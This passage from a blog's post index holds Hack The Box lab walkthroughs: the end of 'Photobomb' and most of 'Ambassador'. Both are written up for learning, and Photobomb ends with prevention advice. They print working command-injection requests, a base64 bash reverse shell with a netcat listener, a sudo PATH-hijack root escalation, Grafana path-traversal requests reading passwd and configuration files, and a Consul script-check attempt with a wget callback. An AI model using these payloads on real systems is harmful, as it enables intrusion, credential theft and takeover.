4‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ200      GET       22l       95w      843c http://photobomb.htb/401      GET        7l       12w      188c http://photobomb.htb/printer401      GET        7l       12w      188c http://photobomb.htb/printerfriendly401      GET        7l       12w      188c http://photobomb.htb/printers401      GET        7l       12w      188c http://photobomb.htb/printer_friendly401      GET        7l       12w      188c http://photobomb.htb/printer-friendly401      GET        7l       12w      188c http://photobomb.htb/printerFriendly401      GET        7l       12w      188c http://photobomb.htb/printer2401      GET        7l       12w      188c http://photobomb.htb/printer-ink401      GET        7l       12w      188c http://photobomb.htb/printer_page[####################] - 2m    119601/119601  0s      found:10      errors:0[####################] - 2m    119601/119601  677/s   http://photobomb.htb/There was a /printer page, but it required authentication.The home page had something about credentials being in a welcome package, but I did not have that package. I looked at the page source. It included a JavaScript file that contains some credentials.function init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://REDACTED@photobomb.htb/printer');  }}window.onload = init;I used those credentials to access the ‚Äò/printer‚Äô page.This page had a bunch of images. And it allowed downloading them in different file types and sizes.Thinking that the application might have used shell commands to transform the images, I tried executing commands. I launched a web server on my machine and tried to make the application sends requests to it. I quickly found that I could use ; in the file type and append a command to it.POST /printer HTTP/1.1Host: photobomb.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 106Origin: http://photobomb.htbAuthorization: Basic cEgwdDA6YjBNYiE=Connection: closeReferer: http://photobomb.htb/printerUpgrade-Insecure-Requests: 1photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg%3bwget+http%3a//10.10.14.143%3b&amp;dimensions=30x20This wget sent a request to my web server. So I knew I could execute code on the server. I used that to get a reverse shell.First I base64 encoded the reverse shell command to prevent having issues with special characters.$ echo 'bash  -i &gt;&amp; /dev/tcp/10.10.14.143/4444 0&gt;&amp;1 ' | base64YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAKAnd I sent that command in the file type parameter.POST /printer HTTP/1.1Host: photobomb.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 106Origin: http://photobomb.htbAuthorization: Basic cEgwdDA6YjBNYiE=Connection: closeReferer: http://photobomb.htb/printerUpgrade-Insecure-Requests: 1photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg%3becho+-n+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK+|+base64+-d+|+bash+%3b&amp;dimensions=30x20My netcat listener got a hit and I was on the server.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.143] from (UNKNOWN) [10.129.14.41] 47186bash: cannot set terminal process group (705): Inappropriate ioctl for devicebash: no job control in this shellwizard@photobomb:~/photobomb$ whoamiwhoamiwizardwizard@photobomb:~/photobomb$ ls ~/ls ~/photobombuser.txtwizard@photobomb:~/photobomb$ cat ~/user.txtcat ~/user.txtREDACTEDGetting rootI copied my SSH public key to the server and reconnected with SSH.wizard@photobomb:~$ mkdir .sshmkdir .sshwizard@photobomb:~$ chmod 700 .sshchmod 700 .sshwizard@photobomb:~$ cd .sshcd .sshwizard@photobomb:~/.ssh$ echo ssh-rsa AAAA... &gt; authorized_keys&lt;4T7wbwU6/l8Pa8l7ezQkX7Ko4Av2m8Es= &gt; authorized_keyswizard@photobomb:~/.ssh$ chmod 600 authorized_keyschmod 600 authorized_keysThen I checked if I could run anything with sudo.wizard@photobomb:~$ sudo -lMatching Defaults entries for wizard on photobomb:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb:    (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~$ ls -la /opt/cleanup.sh-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.shI was able to run a cleanup script as root. I could not modify the script, so I looked at what it did.#!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then  /bin/cat log/photobomb.log &gt; log/photobomb.log.old  /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;The script was making a backup of some logs. And making sure all the original images belonged to root. It was using find to get all images and change their owner. But it did not provide the full path to the find command. And the sudo configuration had SETENV. This meant I could change environment variables when using sudo to run the script.I created a find script in my home folder. Then I modified the PATH variable to include my home folder when calling the cleanup script.wizard@photobomb:~$ cat find#!/bin/bash/bin/bash -pwizard@photobomb:~$ chmod +x findwizard@photobomb:~$ sudo PATH=/home/wizard:$PATH /opt/cleanup.shroot@photobomb:/home/wizard/photobomb# whoamirootroot@photobomb:/home/wizard/photobomb# cat /root/root.txtREDACTEDPreventionThe first issue with the box was with having credentials in JavaScript. Just don‚Äôt do that, ever!Next, the web application was using user supplied arguments in a command sent to the shell.post '/printer' do  photo = params[:photo]  filetype = params[:filetype]  dimensions = params[:dimensions]  # handle inputs  if photo.match(/\\.{2}|\\//)    halt 500, 'Invalid photo.'  end  if !FileTest.exist?( \"source_images/\" + photo )    halt 500, 'Source photo does not exist.'  end  if !filetype.match(/^(png|jpg)/)    halt 500, 'Invalid filetype.'  end  if !dimensions.match(/^[0-9]+x[0-9]+$/)    halt 500, 'Invalid dimensions.'  end  case filetype  when 'png'    content_type 'image/png'  when 'jpg'    content_type 'image/jpeg'  end  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype  response['Content-Disposition'] = \"attachment; filename=#{filename}\"  if !File.exists?('resized_images/' + filename)    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename    puts \"Executing: #{command}\"    system(command)  else    puts \"File already exists.\"  end  if File.exists?('resized_images/' + filename)    halt 200, {}, IO.read('resized_images/' + filename)  end  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype  message = 'Failed to generate a copy of ' + photo  halt 500, messageendThere was some validation around the parameters. But it‚Äôs not sufficient. The code makes sure that the file type contains png or jpg. But it should make sure it does not contain anything else. Since the application only supports two file types, it would have been easy to reject anything that is not one of them. And then use hard-coded values instead of the ones provided by the user.There must be ways to escape the shell parameters in Ruby. But in this case, the list of acceptable options is limited. It could have easily be validated against an allowed list.Then I got root by exploiting a script that I could run with sudo. The script should have used full path for all the commands it ran. Also, there was no reason to allow setting environment variables when calling sudo."
  },
  
  {
    "title": "Hack The Box - Ambassador",
    "url": "/posts/HackTheBox-Walkthrough-Ambassador/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-01-28 00:00:00 +0800",
    





    
    "snippet": "This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...",
    "content": "This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it.  Room: Ambassador  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Ambassador  Author: DirectRootEnumerationI launched Rustscan to check the box for open ports.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------üåçHACK THE PLANETüåç[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.129.111.97:22Open 10.129.111.97:80Open 10.129.111.97:3000Open 10.129.111.97:3306[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 18:51 ESTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.Scanning 10.129.111.97 [2 ports]...Scanned at 2022-11-08 18:51:04 EST for 118sPORT     STATE SERVICE REASON  VERSION22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc=|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs=|   256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_  Supported Methods: GET POST OPTIONS HEAD|_http-generator: Hugo 0.94.2|_http-title: Ambassador Development Server|_http-server-header: Apache/2.4.41 (Ubuntu)3000/tcp open  ppp?    syn-ack| fingerprint-strings:|   FourOhFourRequest:|     HTTP/1.0 302 Found...3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2| mysql-info:|   Protocol: 10|   Version: 8.0.30-0ubuntu0.20.04.2|   Thread ID: 11|   Capabilities flags: 65535|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSigpipes, LongPassword, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins|   Status: Autocommit|   Salt: o`H\\x0CL|]MTAjm\\x0CIM\\x1F'8%\\x1F|_  Auth Plugin Name: caching_sha2_password1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :...Nmap done: 1 IP address (1 host up) scanned in 118.61 secondsThe box had four open ports  22 - SSH  80 - HTTP  3000 - HTTP  3306 - MySQLWebsiteI opened a browser and navigated to the site on port 80.The site was pretty simple. It had a single post. This post had instructions about connecting to a development environment. It said to use developer and that the password would be provided.  Connecting to this machine  Use the developer account to SSH, DevOps will give you the password.I looked around for a hidden password but did not find anything. I ran Feroxbuster to look for hidden pages, but nothing came up.GrafanaNext, I looked at what was on port 3000.It was running Grafana. And it was telling me that it ran version 8.2.0. I looked for vulnerabilities in this version and found that it was vulnerable to LFI. There was also a script on Exploit-DB that showed how to abuse it.All I needed to do was have the path to a plugin followed by a bunch of ../ and the path to the file I wanted to read. The LFI could not be done in a browser, because the extra ../ would get removed. But it worked well in Burp Repeater.I tried to read /etc/password.GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1Host: target.htb:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: redirect_to=%2Fetc%2FpasswdUpgrade-Insecure-Requests: 1And it worked.HTTP/1.1 200 OKAccept-Ranges: bytesCache-Control: no-cacheContent-Length: 1983Content-Type: text/plain; charset=utf-8Expires: -1Last-Modified: Mon, 14 Mar 2022 02:56:37 GMTPragma: no-cacheX-Content-Type-Options: nosniffX-Frame-Options: denyX-Xss-Protection: 1; mode=blockDate: Wed, 09 Nov 2022 00:20:01 GMTConnection: closeroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindeveloper:x:1000:1000:developer:/home/developer:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsegrafana:x:113:118::/usr/share/grafana:/bin/falsemysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/falseconsul:x:997:997::/home/consul:/bin/falseI found the LFI vulnerability quickly, but from there it took me a while to find how to use it. I read a bunch of files, but nothing I could use to get access to the server.I read the Grafana configuration.GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1Host: target.htb:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: redirect_to=%2FUpgrade-Insecure-Requests: 1It returned a huge configuration file. It contained an admin password.#################################### Security ####################################[security]# disable creation of admin user on first start of grafana;disable_initial_admin_creation = false# default admin user, created on startup;admin_user = admin# default admin password, can be changed before first start of grafana,  or in profile settingsadmin_password = REDACTEDI used the password to login in Grafana.I spent some time trying to find something in Grafana. Maybe I could use it to run some commands on the server. But I did not find anything.After a while, I went back to the LFI and used it to extract an SQLite database.GET /public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1Host: target.htb:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: redirect_to=%2FUpgrade-Insecure-Requests: 1I copied the database locally and looked around. The user table looked promising. But it only contained the admin user, and I already had their password.$ sqlite3 db.db    SQLite version 3.39.4 2022-09-29 15:55:41Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Select * From user;1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-11-11 13:23:59|0sqlite&gt; The data_source table was more interesting.sqlite&gt; Select * From sqlite_master Where name = 'data_source';table|data_source|data_source|41|CREATE TABLE `data_source` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `org_id` INTEGER NOT NULL, `version` INTEGER NOT NULL, `type` TEXT NOT NULL, `name` TEXT NOT NULL, `access` TEXT NOT NULL, `url` TEXT NOT NULL, `password` TEXT NULL, `user` TEXT NULL, `database` TEXT NULL, `basic_auth` INTEGER NOT NULL, `basic_auth_user` TEXT NULL, `basic_auth_password` TEXT NULL, `is_default` INTEGER NOT NULL, `json_data` TEXT NULL, `created` DATETIME NOT NULL, `updated` DATETIME NOT NULL, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0)sqlite&gt; Select * From data_source;2|1|1|mysql|mysql.yaml|proxy||REDACTED|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-11 13:06:10|0|{}|1|uKewFgM4zPort 3306 was open, so I tried connecting to it.$ mysql -h target -ugrafana -pREDACTEDWelcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 23Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt;It worked, so I looked around. There was a suspicious whackywidget database.MySQL [(none)]&gt; Show Databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0.059 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; Show Tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0.089 sec)MySQL [whackywidget]&gt; Select * From users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | SOME_BASE64                              |+-----------+------------------------------------------+1 row in set (0.198 sec)The database had a users table that contained a base64 encoded password. I decoded it, and used the password to SSH to the server as developer and get the user flag.$ echo -n  SOME_BASE64 | base64 -dREDACTED$ ssh developer@target   developer@target's password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri 11 Nov 2022 02:13:46 PM UTC  System load:           0.07  Usage of /:            80.9% of 5.07GB  Memory usage:          38%  Swap usage:            0%  Processes:             226  Users logged in:       0  IPv4 address for eth0: 10.129.47.199  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca73 * Super-optimized for small spaces - read how we shrank the memory   footprint of MicroK8s to make it the smallest full K8s around.   https://ubuntu.com/blog/microk8s-memory-optimisation0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Fri Nov 11 14:13:39 2022 from 10.10.14.143developer@ambassador:~$ lssnap  user.txtdeveloper@ambassador:~$ cat user.txt REDACTEDPrivilege EscalationStatic Site GeneratorOnce connected, I started looking around the server. I quickly found a folder that contained the source for the site on port 80.developer@ambassador:~$ ls -l /total 68lrwxrwxrwx   1 root      root          7 Feb 23  2022 bin -&gt; usr/bindrwxr-xr-x   4 root      root       4096 Sep 27 14:50 bootdrwxr-xr-x  18 root      root       4000 Nov 12 12:06 devdrwxr-xr-x  10 developer developer  4096 Sep  2 01:39 development-machine-documentationdrwxr-xr-x 103 root      root       4096 Sep 27 14:49 etcdrwxr-xr-x   3 root      root       4096 Mar 13  2022 homelrwxrwxrwx   1 root      root          7 Feb 23  2022 lib -&gt; usr/liblrwxrwxrwx   1 root      root          9 Feb 23  2022 lib32 -&gt; usr/lib32...developer@ambassador:~$ cd /development-machine-documentation/developer@ambassador:/development-machine-documentation$ ls -ltotal 40drwxr-xr-x 2 developer developer 4096 Mar 13  2022 archetypes-rw-r--r-- 1 developer developer  114 Sep  2 01:37 config.tomldrwxr-xr-x 3 developer developer 4096 Mar 13  2022 contentdrwxr-xr-x 2 developer developer 4096 Mar 13  2022 data-rwxr-xr-x 1 developer developer  491 Sep  1 21:55 deploy.shdrwxr-xr-x 3 developer developer 4096 Mar 13  2022 layoutsdrwxr-xr-x 7 root      root      4096 Sep  2 01:37 publicdrwxr-xr-x 3 developer developer 4096 Mar 13  2022 resourcesdrwxr-xr-x 2 developer developer 4096 Mar 13  2022 staticdrwxr-xr-x 3 developer developer 4096 Mar 13  2022 themesdeveloper@ambassador:/development-machine-documentation$ cat deploy.sh #!/bin/bashset -e#OLD_VERSION=$(grep version config.toml | cut -d \" \" -f 3 | cut -d \"'\" -f 2)NEW_VERSION=$(date -I)# update version in config.tomlsed -i \"/version =/c\\version = '$NEW_VERSION' # Do not update this manually, deploy.sh will handle it\" config.toml# build the siterm -rf publichugo -D# backup the old site in a .zip#zip -r /var/www/backups/$OLD_VERSION.zip /var/www/html# put new site in directory for servingrm -rf /var/www/html/*cp -r public/* /var/www/htmlThe deploy script was using the Hugo static site generator to build the site from Markdown files.I listed the content of public and the webroot. It looked like the deploy script was being run by root.developer@ambassador:/development-machine-documentation$ ls -l public/total 36-rw-r--r-- 1 root root 1793 Sep  2 01:37 404.htmldrwxr-xr-x 3 root root 4096 Sep  2 01:37 anankedrwxr-xr-x 2 root root 4096 Sep  2 01:37 categoriesdrwxr-xr-x 2 root root 4096 Mar 13  2022 images-rw-r--r-- 1 root root 3654 Sep  2 01:37 index.html-rw-r--r-- 1 root root 1230 Sep  2 01:37 index.xmldrwxr-xr-x 4 root root 4096 Sep  2 01:37 posts-rw-r--r-- 1 root root  645 Sep  2 01:37 sitemap.xmldrwxr-xr-x 2 root root 4096 Sep  2 01:37 tagsdeveloper@ambassador:/development-machine-documentation$ ls -l /var/www/html/total 36-rw-r--r-- 1 root root 1793 Sep  2 01:37 404.htmldrwxr-xr-x 3 root root 4096 Sep  2 01:37 anankedrwxr-xr-x 2 root root 4096 Sep  2 01:37 categoriesdrwxr-xr-x 2 root root 4096 Sep  2 01:37 images-rw-r--r-- 1 root root 3654 Sep  2 01:37 index.html-rw-r--r-- 1 root root 1230 Sep  2 01:37 index.xmldrwxr-xr-x 4 root root 4096 Sep  2 01:37 posts-rw-r--r-- 1 root root  645 Sep  2 01:37 sitemap.xmldrwxr-xr-x 2 root root 4096 Sep  2 01:37 tagsI tried modifying the Markdown for the post and the deploy script. I thought that if the deploy script was running on a cron I could get code execution as root this way. But it never ran, so I moved to something else.ConsulWhen I extracted /etc/passwd with the LFI, I saw that the server had a consul user. I looked to see if Consul was running.developer@ambassador:~$ ps aux | grep consulroot        1022  0.5  3.7 794292 74328 ?        Ssl  15:25   0:02 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hclIt was running. I looked into the configuration folder and saw that my user could write some configurations.developer@ambassador:~$ cd /etc/consul.d/developer@ambassador:/etc/consul.d$ ls -latotal 24drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..drwx-wx---   2 root   developer 4096 Nov 11 16:04 config.d-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl-rw-r--r--   1 consul consul     160 Mar 15  2022 READMEdeveloper@ambassador:/etc/consul.d$ echo TEST &gt; config.d/testdeveloper@ambassador:/etc/consul.d$ cat config.d/testTESTThe consul.hcl also had an interesting setting at the end.enable_script_checks = trueI looked at the documentation of this setting and saw a warning saying it could be used to get remote code execution.  enable_script_checks: enable script checks regardless of how they are defined.Security Warning: Enabling script checks in some configurations may introduce a remote execution vulnerability which is known to be targeted by malware. We strongly recommend enable_local_script_checks instead. See this blog post for more details.At this point, I thought I had an easy way to get root. I had to create a health check script that would open a reverse shell to my machine and drop it in /etc/consul.d/config.d/ to get it executed.To test it, I create a small script that would hit my web server.developer@ambassador:~$ cat /tmp/exploit.sh #!/bin/bashwget http://10.10.14.143/consulI created the configuration file and copied it to the folder I could write to.developer@ambassador:~$ cat eric.json{    \"check\": {            \"name\": \"eric\",            \"args\": [              \"/tmp/exploit.sh\"            ],            \"interval\": \"10s\",            \"timeout\": \"1s\"    }}developer@ambassador:~$ cp eric.json /etc/consul.d/config.d/Then I waited, hoping that just dropping the configuration file was enough to get Consul to read it. It was not. I needed to find a way to get the service to reload its configuration. But it was running as root, so I could not restart it.I tried using the command line to register my service.consul services register /etc/consul.d/config.d/eric.jsonIt returned without any errors, but it did not do anything.I also tried the API to register it. This time I got a Permission denied error.developer@ambassador:/opt/my-app/whackywidget$ curl --request PUT --data @/home/developer/eric.json http://127.0.0.1:8500/v1/agent/service/registerPermission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on \"counting\"Whacky WidgetI got stuck here for some time. I was trying to find a way to register the new service or get Consul to restart. But only root could do that.I found an app in opt.developer@ambassador:/etc/consul.d$ ls -l /opt/total 8drwxr-xr-x 4 consul consul 4096 Mar 13  2022 consuldrwxrwxr-x 5 root   root   4096 Mar 13  2022 my-appdeveloper@ambassador:/etc/consul.d$ ls -l /opt/consul/total 16-rw-r--r-- 1 consul consul  394 Mar 13  2022 checkpoint-signature-rw------- 1 consul consul   36 Mar 13  2022 node-iddrwxr-xr-x 3 consul consul 4096 Mar 13  2022 raftdrwxr-xr-x 2 consul consul 4096 Mar 13  2022 serfdeveloper@ambassador:/etc/consul.d$ ls -l /opt/my-app/total 8drwxrwxr-x 4 root root 4096 Mar 13  2022 envdrwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidgetIt looked like the widget from the MySQL database I had used to get the SSH password.developer@ambassador:/etc/consul.d$ cd /opt/my-app/whackywidget/developer@ambassador:/opt/my-app/whackywidget$ lsmanage.py  put-config-in-consul.sh  whackywidgetdeveloper@ambassador:/opt/my-app/whackywidget$ cat 